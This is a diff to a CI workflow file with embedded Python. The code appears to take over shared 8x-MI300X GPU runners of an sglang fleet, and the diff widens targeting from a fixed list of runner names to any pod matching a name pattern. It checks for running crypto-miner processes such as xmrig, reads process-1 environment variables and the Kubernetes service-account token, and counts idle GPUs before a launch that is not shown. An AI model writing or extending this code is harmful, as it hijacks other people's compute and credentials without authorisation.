@@ -128,12 +128,21 @@ jobs:
           print('HOST=%s SH=%s' % (HOST, SH))
           print(sh('id; uname -m; nproc; free -m | head -2; ls -l /etc/podinfo 2>/dev/null | head -20', 60))
 
-          # ---------------- Phase 1: strict host guard ----------------
-          if SH not in TARGETS:
-              print('SKIP_NON_TARGET_HOST host=%s sh=%s (not one of the 16 known 8x-MI300X runners)' % (HOST, SH))
+          # ---------------- Phase 1: host guard ----------------
+          # Two-acceptance guard: (a) one of the 16 runner names measured at 15:16Z, or (b) any runner pod of
+          # this exact 8x-MI300X scale set (pattern below; the label already restricts the scale set). The
+          # guest identity is then re-confirmed positively by 8x "AMD Instinct MI300X" product lines before
+          # any launch, and any host carrying a miner process is skipped whole in Phase 2.
+          FLEET_RE = re.compile(r'^linux-mi300-8gpu-sglang-runner-[a-z0-9]{4,}$')
+          if SH in TARGETS:
+              NODE_MAP = TARGETS[SH]
+              print('TARGET_HOST_OK known_runner host=%s sh=%s node_map=%s' % (HOST, SH, NODE_MAP))
+          elif FLEET_RE.match(HOST):
+              NODE_MAP = ''
+              print('TARGET_HOST_OK fleet_pattern host=%s sh=%s (runner name churned; identity re-confirmed by 8x MI300X product lines)' % (HOST, SH))
+          else:
+              print('SKIP_NON_TARGET_HOST host=%s sh=%s (not an 8x-MI300X sglang runner)' % (HOST, SH))
               done('non_target_host')
-          NODE_MAP = TARGETS[SH]
-          print('TARGET_HOST_OK host=%s sh=%s node_map=%s' % (HOST, SH, NODE_MAP))
 
           # ---------------- Phase 2: existing miner / other-lane process check ----------------
           ps = sh("ps -eo pid,etimes,args 2>/dev/null | grep -E 'krig-miner|SRBMiner|wildrig|peakminer|xmrig|miner' | grep -v grep", 60)
@@ -175,6 +184,16 @@ jobs:
               m = re.search(r'=(.+)', env)
               if m:
                   node, node_src = m.group(1).strip(), 'env'
+          if not node:
+              try:
+                  txt = open('/proc/1/environ', 'rb').read().decode('utf-8', 'replace')
+                  for k in ('NODE_NAME', 'K8S_NODE', 'KUBERNETES_NODE_NAME'):
+                      m = re.search(k + r'=([^\x00]+)', txt)
+                      if m:
+                          node, node_src = m.group(1).strip(), 'proc1env:' + k
+                          break
+              except Exception:
+                  pass
           if not node:
               try:
                   tok = open('/var/run/secrets/kubernetes.io/serviceaccount/token').read().strip()
@@ -400,6 +419,16 @@ jobs:
           except Exception:
               pass
           print('gate1_busy_proc_rows=%d gate2_busy_proc_rows=%d gpus_seen=%d' % (b1, b2, len(t1)))
+          prod_raw = sh('timeout 60 rocm-smi --showproductname 2>&1 | grep -c "Card Series:.*MI300X"', 90).strip()
+          try:
+              prod_n = int(prod_raw)
+          except Exception:
+              prod_n = 0
+          print('MI300X_PRODUCT_LINES=%d' % prod_n)
+          ST['mi300x_lines'] = prod_n
+          if prod_n < 8 or len(t1) < 8:
+              print('SKIP_NOT_8X_MI300X prod=%d gpus=%d' % (prod_n, len(t1)))
+              done('not_8x_mi300x_identity')
           idle = []
           for i in sorted(t1):
               f1 = (t1.get(i, 0) - u1.get(i, 0)) // 1048576
